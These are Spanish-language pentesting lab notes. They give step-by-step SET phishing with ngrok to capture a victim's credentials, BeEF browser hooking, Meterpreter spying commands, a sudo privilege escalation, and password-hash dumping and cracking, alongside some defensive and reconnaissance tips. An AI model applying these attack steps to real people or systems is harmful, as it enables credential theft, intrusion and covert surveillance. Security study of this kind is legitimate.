--- Volver a la pc con kali, a la terminal de listener, se nos mostrará un mensaje indicando que existe 1 sesion abierta
--- En este punto se tiene control total de la pc de la víctima

++ Social Engineer Toolkit (uso fuera de la red local)
--- ngrok http 80
--- Enter
--- Copiar la direccion de ngrok desde la seccion de forwarding, ejemplo: b2360e16.ngrok.io
--- Abir otra terminal
--- Ejecutar los siguientes comandos:
--- msfconsole
--- search webattack
--- search type:auxiliary name:web
--- use auxiliary/scanner/http/[nombre_del_modulo]
--- set:webattack> IP address for the POST back in harvester/tabnabbing: <colocar_la_direccion_de_ngrok>
--- set:webattack> Enter the url to clone:<ingresar_la_url_que_deseemos>
--- Ir a la pc con windows (procurar que se encuentre en una red distinta)
--- Acceder al link de ngrok
--- Regresar al kali, a la terminal de set, en ella se verán las credenciales del usuario, si el mismo las ingresó al visitar el sitio web

++ Uso de beef fuera de la red local
--- URL: https://github.com/stormshadow07/Beef-Over-Wan
--- Ir a la ubicación del programa
--- chmod +x <nombre_ejecutable.py>
--- nano /root/.ngrok2/ngrok.yml 
--- Editar la seccion de tunnels
tunnels:
first-app:
	addr: 80
	proto: http
second-app:
	addr: 3000
	proto: http
--- Ctrl + G y Ctrl + X
--- ngrok start --all
--- Abrir otra terminal
--- ./BeeFOverWan.py
--- 1
--- Volver a la terminal de ngrok y copiar la url de forwarding, la primera (ejemplo: 4427f328.ngrok.io)
--- Pegar en la otra terminal
--- Volver a la terminal de ngrok y copiar la url de forwarding, la ultima
--- Pegar en la otra terminal
--- Se nos mostrarán las credenciales de acceso al portal de beef y el hooked link a enviar a la víctima
--- Ingresar a la interfaz web de beef
--- Ingresar las credenciales (beef/beef)
--- Regresar a la terminal de beef
--- Copiar el enlace (hooked link to send to victim)
--- Ir a la máquina de la víctima y acceder a dicho link
--- Volver a la interfaz web de beef y allí nos aparecerá el acceso en la sección de hooked browsers

++ Phising email attack (SET)
--- Copiar la url que deseemos en la terminal
--- set:webattack> Enter the url to clone:<url_deseada>
--- Usar un servicio de email tal como: https://www.5ymail.com/
--- Colocar el email de la víctima
--- Colocar el cuerpo del correo
--- Regresar a la terminal de ngrok
--- Copiar el último enlace de forwarding
--- Pegarlo como url incrustado en el cuerpo del correo
--- Enviar el correo
--- Una vez la víctima acceda al correo e ingrese las credenciales las mismas serán capturadas en la terminal (SET)

++ Como detectar meterpreter en nuestra pc
--- URL: https://github.com/DamonMohammadbagher/Meterpreter_Payload_Detection
--- Descargar el programa
--- Navegar al directorio donde se encuentre
--- Abrir cmd
--- cd <ubicacion> <nombre_del_archivo_de_meterpreter>
--- Enter
--- El análisis comenzará
--- De encontrar algún resultado se nos mostrará el nombre del archivo y el id
--- Debemos proceder a detener el proceso
--- Abrir el administrador de tareas, buscar el proceso y detenerlo


++ Como protegerse de beef 
--- URL: https://addons.mozilla.org/en-US/firefox/addon/javascript-toggler/
--- URL: https://addons.opera.com/en/extensions/details/javascript-toggle-on-and-off/
--- Nota: esta extensión nos permite activar y desactivar javascript. El desactivar javascript impide los ataques de beef


++ Como prevenir el phishing
--- Verificar las siguientes secciones de un correo:
--- mailed-by y signed-by
--- Proceder a buscar ese dominio en la web para comprobar su legitimidad
--- Utilizar la herramienta virustotal: www.virustotal.com/gui/home/url
--- Pegar en ella cualquier enlace sospechoso de un correo y escanearlo


++ OSINT
--- <url/robots.txt>
--- <url/favicon.ico>
--- Verificar información de un icono encontrado (hash): https://owasp.org/www-community/favicons_database
--- Verificar el hash de un icono descargado, abir la terminal y ejecutar el siguiente comando: md5sum <nombre_archivo_icono>
--- Nos aparecerá en la terminal el hash asociado al archivo del icono, este puede ser verificado en el sitio web descrito anteriormente para así poder tener información como la tecnología empleada en el servidor
--- El hash también puede calcularse usando extensiones del navegador:
----- Firefox: https://addons.mozilla.org/en-US/firefox/addon/calculate-md5-sha1-hash-che-1/
----- Chrome: https://chromewebstore.google.com/detail/md5sum/aljmmecjkheogmcmbffbpmhbgnkijhlk
--- Si el hash del icono no se encuentra en la base de datos de owasp podemos buscar el mismo en google siguiendo la siguiente sintaxis: <"hash">
--- HTTPS Headers: en la terminal ejecutar lo siguiente: 
--- curl <url> -v (Nos permite saber el header de una página web para así conocer las tecnologías con las cuales está diseñado
--- Nos aparecerá todo el código de la página
--- Nos dirigimos a la parte de arriba para ver el header y datos sobre la tecnología empleada
--- Una vez identificadas las tecnologías podemos buscar vulnerabilidades asocidas en: https://www.exploit-db.com/
--- HTTPS Headers: También podemos obtener esta informacion desde firefox siguiendo estos pasos:
----- Tools ---> Browser Tools ---> Web Developer Tools ---> Network ---> Refrescar la página web ---> En la parte inferior del navegador buscar la sección file / y dar clic allí ---> A la derecha dar clic en Headers ---> Ubicar la información relacionada a las tecnologías


++ Identificar las tecnologías de un sitio web
--- URL1: https://www.wappalyzer.com/ (De pago después de 1 uso)
--- URL2: https://builtwith.com/ (Uso gratuito completo)


++ Google dorking
--- Ejemplo de uso #1 = site:bbc.co.uk (Mostrará todas las webs que contengan el sitio bbc.co.uk
--- Ejemplo de uso #2 = site:bbc.co.uk filetype:pdf (Permite lo anterior más encontrar archivos pdf)
--- Ejemplo de uso #3 = site:bbc.co.uk intitle:hack (Permite mostrar las webs de bbc.co.uk con el titulo hack)
--- Ejemplo de uso #4 = site:bbc.co.uk inurl:hack (Permite mostrar las webs de bbc.co.uk que tengan en su url hack)
--- Nota: estas combinaciones también son compatibles con otros buscadores como duckduckgo, yandex, bing, etc


++ Wayback Machine 
--- URL: https://archive.org/web/
--- Ingresar cualquier sitio web para explorarlo a través del tiempo


++ Github Exposure
--- Se puede probar la búsqueda de información relacionada a un sitio web

++ Automated Discovery (gobuster)
--- Abrir el explorador de archivos de kali y navegar al siguiente directorio:
--- /usr/share/worldlists/ (En este directorio de encuentran worldlists útiles
--- Para usar alguno de estos worldlists y encontrar contenido de forma automática procedemos a usar los siguientes comandos:
--- gobuster
--- y (Si no está instalado aún)
--- gobuster dir --url <sitio_web_a_escanear> -w /usr/share/worldlists/dirb/commom.txt (Nota: se puede probar con otros worldlists)
--- Enter
--- El programa probará todas las cadenas del worldlist en contra del sitio web


++ Automated Discovery (dirb)
--- dirb <sitio_web_a_escanear> /usr/share/worldlists/dirb/commom.txt (Nota: se puede probar con otros worldlists)
--- Enter
--- El programa probará todas las cadenas del worldlist en contra del sitio web


++ Automated Discovery (ffuf)
--- ffuf -w /usr/share/worldlists/dirb/commom.txt -u  <sitio_web_a_escanear> FUZZ
(Nota: se puede probar con otros worldlists)
--- Enter
--- El programa probará todas las cadenas del worldlist en contra del sitio web


++ Root access vulnerability (Ubuntu 14.04)
--- sudo -u#-1 /bin/bash 


++ Crack Linux Hash (John the Ripper)
--- ls /etc/
--- cat /etc/passwd (Muestra el listado de los usuarios e información extra)
--- sudo cat /etc/shadow (Muestra los hash de las contraseñas de los usuarios)
--- cd Desktop
--- cat /etc/passwd > ~/Desktop/passwd.txt (Copiar archivo passwd al escritorio)
--- sudo cat /etc/shadow > ~/Desktop/shadow.txt (Copiar archivo shadow al escritorio)
--- unshadow passwd.txt shadow.txt > hashtocrack.txt (Combinar ambos archivos)
--- john (Accede al programa John the Ripper)
--- Ir a la ruta /usr/share/worldlists y copiar el archivo rockyou.txt.gz al escritorio (Ese archivo es un worldlist, necesario para crackear los hashes usando john)
--- Extraer el archivo
--- head -n 50 rockyou.txt (Muestra las primeras 50 líneas del archivo)
--- cat rockyou.txt | wc -l (Muestra el número de líneas que tiene el archivo)
--- john --format=crypt --worldlist=rockyou.txt hashtocrack.txt
--- john hashtocrack.txt --show
--- Se mostrarán los usuarios y las contraseñas asociadas

++ Crack Windows hash (Mimikatz)
--- Windows usa el algoritmo NTLM
--- URL: https://github.com/ParrotSec/mimikatz
--- Ejecutar el .exe
--- Se abrirá un cmd, ejecutar los siguientes comandos:
--- priviledge::debug
--- token::elevate
--- lsadump::sam
--- Aparecerá un listado de usuarios y sus hashs
--- Guardar este listado en un .txt para proceder a crackearlos en kali linux. Podemos usar un servicio online como: https://pastebin.com/
--- Para intentar crackear los hash podemos usar crackstation: https://crackstation.net/
--- Para hacerlo en kali usando john the ripper seguir los siguientes pasos:
--- Crear un .txt en el escritorio de kali y copiar en el todos los hashes
--- Ejecutar los siguientes comandos:
--- john --format=NT --rules -w=<archivo_wordlist.txt> <archivo_hash.txt>
--- A continuación aparecerán las contraseñas encontradas, si no aparecen todas se puede usar otro worldlist o seguir usando crackstation.net


++ Data integrity (Hash verification)
--- Crear un archivo en el escritorio
--- Calcular su hash ejecutando el siguiente comando:
--- md5sum <nombre_archivo>
--- Modificar el archivo y guardarlo
--- Caluclar nuevamente el hash
--- md5sum <nombre_archivo>
--- Se evidenciará que tras la modificación los hashs son distintos, indicando que la integridad de la data ha cambiado
--- Podemos usar otros algoritmos hash para hacer la comparativa, ejemplo: sha256
--- sha256sum <nombre_archivo>


++ Cifrar (Tool online)
--- URL: https://encrypt.toolpie.com/

++ Hashing <> Cifrar (No son iguales)
--- Hashing es usado para comprobar la integridad de la data
--- El cifrado es usado para que la data la enviarse o compartirse solo pueda leerse por el receptor de confianza al compartirse una clave secreta


++ Meterpreter comandos útiles (ya teniendo la sesión activa)
--- screenshot (Tomar captura del escritorio)
--- screenshare (Ver en tiempo real el escritorio)
--- Ctrl + C para parar la visualización
--- pwd (Conocer el directorio en el cual nos encontramos en la pc de la victima)
--- dir (Listar los directorios de la pc de la víctima)
--- cd <ruta> (Navegar a la ruta que deseemos de la pc de la victima>
--- cd .. (Regresar a la ruta anterior de la pc de la victima>
--- upload <nombre_archivo> (Para mandar un archivo a la victima)
--- rm <combre_archivo> (Para eliminar un archivo de la victima)
--- hashdump (Muestra la lista de los usuarios y sus hashs)
--- record_mic <tiempo> (Grabar el audio del equipo por x tiempo)
--- execute <nombre_proceso> (Abrir algún programa, ejemplo: execute firefox.exe)
--- pkill <nombre_proceso> (Cerrar algún programa, ejemplo: pkill paint.exe)
--- reboot (Reiniciar el equipo)
--- help (Ver todos los demás comandos útiles)


++ WPSCAN
--- sudo apt-get install wpscan


















































































































































